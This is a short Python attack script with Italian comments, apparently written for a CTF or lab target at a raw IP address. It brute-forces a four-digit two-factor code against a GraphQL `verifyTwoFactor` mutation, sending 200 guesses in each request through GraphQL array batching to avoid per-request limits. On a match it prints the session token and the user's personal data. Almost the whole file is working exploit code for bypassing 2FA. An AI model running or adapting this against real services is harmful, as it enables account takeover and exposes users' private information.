import requests
import json

URL = "http://154.57.164.83:30204/graphql"
# copiati da Burpsuite
HEADERS = {
    "Host": "154.57.164.83",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "http://154.57.164.83:30204/profile",
    "Content-Type": "application/json",
    "Content-Length": "889",
    "Origin": "http://154.57.164.83:30204",
    "Connection": "keep-alive",
    "Priority": "u=4"
}

TOKEN = "2d8af660-3c98-40d3-9369-3125374bc2e9"
# numero di query in una richiesta
BATCH_SIZE = 200
QUERY = """mutation GeneratedOperation($token: String!, $otp: String!) {
  verifyTwoFactor(token: $token, otp: $otp) {
    token
    user {
      id
      email
      firstName
      lastName
      username
      plan
      planStatus
      trialEndDate
      nextBillingDate
      dataUsage
      address
      phoneNumber
      twoFactorAuthEnabled
    }
  }
}"""

# creaiamo il batch
def make_batch(start, end):
    """Array batching: lista di operazioni separate"""
    batch = []
    for i in range(start, end):
        otp = str(i).zfill(4) # manteniamo il formato a 4 cifre con zeri iniziali
        batch.append({
            "query": QUERY,
            "variables": {
                "token": TOKEN,
                "otp": otp
            }
        })
    return batch

for batch_start in range(0, 10000, BATCH_SIZE):
    batch_end = min(batch_start + BATCH_SIZE, 10000)
    payload = make_batch(batch_start, batch_end)

    resp = requests.post(URL, headers=HEADERS, json=payload, verify=False)
    
    try:
        data = resp.json()
    except Exception:
        print(f"Risposta non JSON al batch {batch_start}-{batch_end}: {resp.text[:200]}")
        continue

    # controlla se la risposta è un array
    if not isinstance(data, list):
        print(f"⚠️ Array batching non supportato. Risposta: {str(data)[:200]}")
        break

    for idx, result in enumerate(data):
        otp_tried = str(batch_start + idx).zfill(4)

        # controlla se la risposta non ha errori e contiene un token
        has_errors = bool(result.get("errors"))
        verify = result.get("data", {}).get("verifyTwoFactor")
        has_token = verify and verify.get("token")

        if not has_errors and has_token:
            print(f"\n✅ OTP trovato: {otp_tried}")
            print(f"Token: {verify['token']}")
            print(f"User: {json.dumps(verify['user'], indent=2)}")
            exit()

    print(f"Batch {batch_start}-{batch_end} completato, nessun match")

print("Scansione completata, OTP non trovato.")
